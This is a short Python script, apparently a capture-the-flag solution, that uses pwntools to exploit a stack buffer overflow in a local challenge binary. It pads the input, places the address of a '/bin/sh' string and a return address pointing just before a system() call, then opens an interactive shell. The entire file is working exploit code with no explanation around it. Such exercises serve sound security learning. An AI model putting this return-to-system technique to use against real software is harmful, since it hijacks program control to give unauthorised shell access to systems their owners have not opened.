from pwn import *

challenge = ELF(r'PATHTOBINARY')

win_address = 0x080491d5 #Address to the instruction just before the system() call
bin_param = 0x804A045 #Address pointing to the "/bin/sh" string

payload = b'A'*(40) + p32(bin_param) + b'A'*(12) + p32(win_address) + b"\n"

p = challenge.process()
p.sendline(payload) 
p.interactive()
